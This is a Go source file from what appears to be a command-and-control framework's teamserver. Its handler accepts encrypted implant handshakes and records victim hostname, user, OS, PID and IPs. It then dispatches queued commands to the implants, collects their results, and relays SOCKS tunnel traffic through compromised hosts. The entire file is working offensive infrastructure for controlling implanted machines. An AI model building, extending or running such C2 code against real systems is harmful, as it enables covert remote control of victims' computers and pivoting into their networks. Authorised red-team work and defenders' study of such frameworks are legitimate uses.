package agent

import (
	"fmt"
	"log"
	"net"
	"path/filepath"
	"time"

	"c2/internal/teamserver/crypto"
	"c2/internal/teamserver/database"
	"c2/internal/teamserver/socks5"
	"c2/pkg/protocol"
)

// Handler processes incoming agent connections.
type Handler struct {
	agentMgr      *Manager
	taskMgr       *TaskManager
	masterKey     []byte
	socksRegistry *socks5.ProxyRegistry
}

// NewHandler creates a new agent connection handler.
func NewHandler(agentMgr *Manager, taskMgr *TaskManager, masterKey []byte, socksRegistry *socks5.ProxyRegistry) *Handler {
	return &Handler{
		agentMgr:      agentMgr,
		taskMgr:       taskMgr,
		masterKey:     masterKey,
		socksRegistry: socksRegistry,
	}
}

// HandleConnection processes a new agent connection.
// listenerID identifies which listener accepted the connection.
func (h *Handler) HandleConnection(listenerID string, conn net.Conn) {
	defer conn.Close()

	log.Printf("[DEBUG] Handling connection from %s", conn.RemoteAddr())

	// Set a read deadline for the handshake
	conn.SetReadDeadline(time.Now().Add(30 * time.Second))

	// Read handshake
	msgType, encryptedPayload, err := protocol.ReadFullEnvelope(conn)
	if err != nil {
		log.Printf("[ERROR] Reading handshake from %s: %v", conn.RemoteAddr(), err)
		return
	}

	if msgType != protocol.MsgHandshakeRequest {
		log.Printf("[ERROR] Expected handshake request, got type %d from %s", msgType, conn.RemoteAddr())
		return
	}

	// Handshake is encrypted with the master key directly
	masterSession, err := crypto.NewCipherSession(h.masterKey)
	if err != nil {
		log.Printf("[ERROR] Creating master cipher session: %v", err)
		return
	}

	plaintext, err := masterSession.Decrypt(encryptedPayload)
	if err != nil {
		log.Printf("[ERROR] Decrypting handshake from %s: %v", conn.RemoteAddr(), err)
		return
	}

	var handshake protocol.HandshakeRequest
	if err := protocol.Deserialize(plaintext, &handshake); err != nil {
		log.Printf("[ERROR] Deserializing handshake from %s: %v", conn.RemoteAddr(), err)
		return
	}

	log.Printf("[DEBUG] Handshake from %s: agent=%s hostname=%s os=%s/%s user=%s exe=%s",
		conn.RemoteAddr(), handshake.AgentID, handshake.Hostname, handshake.OS, handshake.Arch, handshake.Username,
		filepath.Base(handshake.ExePath))

	// Derive per-agent key
	agentKey, err := crypto.DeriveAgentKey(h.masterKey, handshake.AgentID)
	if err != nil {
		log.Printf("[ERROR] Deriving agent key for %s: %v", handshake.AgentID, err)
		return
	}

	agentCipher, err := crypto.NewCipherSession(agentKey)
	if err != nil {
		log.Printf("[ERROR] Creating agent cipher for %s: %v", handshake.AgentID, err)
		return
	}

	// Build agent record
	localIPsJSON := marshalLocalIPs(handshake.LocalIPs)
	lid := listenerID // capture for pointer

	// Extract executable name from full path
	exeName := filepath.Base(handshake.ExePath)
	if exeName == "" || exeName == "." || exeName == "/" {
		exeName = "unknown"
	}

	// Extract remote IP from connection (strip port)
	remoteIP, _, err := net.SplitHostPort(conn.RemoteAddr().String())
	if err != nil {
		remoteIP = conn.RemoteAddr().String()
	}

	agent := &database.Agent{
		ID:                handshake.AgentID,
		ListenerID:        &lid,
		Hostname:          handshake.Hostname,
		OS:                handshake.OS,
		Arch:              handshake.Arch,
		Username:          handshake.Username,
		PID:               int(handshake.PID),
		LocalIPs:          localIPsJSON,
		Version:           handshake.Version,
		ExeName:           exeName,
		RemoteIP:          remoteIP,
		HeartbeatInterval: 60,
		Status:            "active",
		MetadataJSON:      marshalMetadata(handshake.ExeDir, exeName),
	}

	// Register agent
	h.agentMgr.Register(agent, conn, agentCipher)

	// Send handshake response
	response := protocol.HandshakeResponse{
		Accepted:          true,
		AgentID:           handshake.AgentID,
		HeartbeatInterval: 60,
		JitterPercent:     20,
		ServerTime:        time.Now().Unix(),
	}

	respBytes, err := protocol.Serialize(response)
	if err != nil {
		log.Printf("[ERROR] Serializing handshake response: %v", err)
		return
	}

	// HandshakeResponse MUST use master key — implant hasn't derived session key yet
	encryptedResp, err := masterSession.Encrypt(respBytes)
	if err != nil {
		log.Printf("[ERROR] Encrypting handshake response: %v", err)
		return
	}

	envelope := protocol.EncodeEnvelope(protocol.MsgHandshakeResponse, encryptedResp)
	if _, err := conn.Write(envelope); err != nil {
		log.Printf("[ERROR] Sending handshake response: %v", err)
		return
	}

	// Remove read deadline for the main loop
	conn.SetReadDeadline(time.Time{})

	// Main agent loop: read messages from the implant
	h.agentLoop(conn, handshake.AgentID, agentCipher)
}

func (h *Handler) agentLoop(conn net.Conn, agentID string, cipher *crypto.CipherSession) {
	heartbeatInterval := 60 * time.Second
	heartbeatTimeout := 3 * heartbeatInterval

	for {
		// Set read deadline based on heartbeat interval
		conn.SetReadDeadline(time.Now().Add(heartbeatTimeout))

		msgType, encryptedPayload, err := protocol.ReadFullEnvelope(conn)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				log.Printf("[DEBUG] Agent %s heartbeat timeout", agentID)
			} else {
				log.Printf("[ERROR] Reading from agent %s: %v", agentID, err)
			}
			return
		}

		// Decrypt
		plaintext, err := cipher.Decrypt(encryptedPayload)
		if err != nil {
			log.Printf("[ERROR] Decrypting message from agent %s: %v", agentID, err)
			return
		}

		switch msgType {
		case protocol.MsgHeartbeat:
			var hb protocol.Heartbeat
			if err := protocol.Deserialize(plaintext, &hb); err != nil {
				log.Printf("[ERROR] Deserializing heartbeat: %v", err)
				continue
			}
			h.agentMgr.UpdateHeartbeat(agentID)

		case protocol.MsgTaskRequest:
			// Agent is polling for tasks
			tasks, err := h.taskMgr.Dequeue(agentID, 5*time.Second)
			if err != nil {
				log.Printf("[ERROR] Dequeuing tasks for %s: %v", agentID, err)
			}

			var taskDefs []protocol.TaskDef
			for _, t := range tasks {
				taskDefs = append(taskDefs, protocol.TaskDef{
					TaskID:    t.ID,
					Command:   t.Command,
					Arguments: t.Arguments,
					Timeout:   uint32(t.TimeoutSec),
				})
			}

			taskResp := protocol.TaskResponse{Tasks: taskDefs}
			respBytes, _ := protocol.Serialize(taskResp)
			encResp, err := cipher.Encrypt(respBytes)
			if err != nil {
				log.Printf("[ERROR] Encrypting task response: %v", err)
				continue
			}

			envelope := protocol.EncodeEnvelope(protocol.MsgTaskResponse, encResp)
			if _, err := conn.Write(envelope); err != nil {
				log.Printf("[ERROR] Sending task response: %v", err)
				return
			}

		case protocol.MsgTaskResult:
			var result protocol.TaskResult
			if err := protocol.Deserialize(plaintext, &result); err != nil {
				log.Printf("[ERROR] Deserializing task result: %v", err)
				continue
			}

			h.taskMgr.Complete(
				result.TaskID, result.Status,
				string(result.Output), result.ErrorMsg,
				int(result.DurationMs),
			)

			h.agentMgr.notifier.Notify(Event{
				AgentID: agentID,
				Type:    EventTaskComplete,
				Data:    result,
			})

		case protocol.MsgTunnelConnected:
			var msg protocol.TunnelConnected
			if err := protocol.Deserialize(plaintext, &msg); err != nil {
				log.Printf("[ERROR] Deserializing tunnel connected: %v", err)
				continue
			}
			if h.socksRegistry != nil {
				h.socksRegistry.HandleTunnelConnected(agentID, msg)
			}

		case protocol.MsgTunnelData:
			var msg protocol.TunnelData
			if err := protocol.Deserialize(plaintext, &msg); err != nil {
				log.Printf("[ERROR] Deserializing tunnel data: %v", err)
				continue
			}
			if h.socksRegistry != nil {
				h.socksRegistry.RouteData(agentID, msg.TunnelID, msg.Data)
			}

		case protocol.MsgTunnelClose:
			var msg protocol.TunnelClose
			if err := protocol.Deserialize(plaintext, &msg); err != nil {
				log.Printf("[ERROR] Deserializing tunnel close: %v", err)
				continue
			}
			if h.socksRegistry != nil {
				h.socksRegistry.HandleTunnelClose(agentID, msg)
			}

		default:
			log.Printf("[WARN] Unknown message type %d from agent %s", msgType, agentID)
		}
	}
}

func marshalMetadata(exeDir, exeName string) *string {
	if exeDir == "" && exeName == "" {
		return nil
	}
	s := fmt.Sprintf(`{"exe_dir":%q,"exe_name":%q}`, exeDir, exeName)
	return &s
}

func marshalLocalIPs(ips []string) *string {
	if len(ips) == 0 {
		return nil
	}
	// Simple JSON array format
	s := "["
	for i, ip := range ips {
		if i > 0 {
			s += ","
		}
		s += fmt.Sprintf("%q", ip)
	}
	s += "]"
	return &s
}
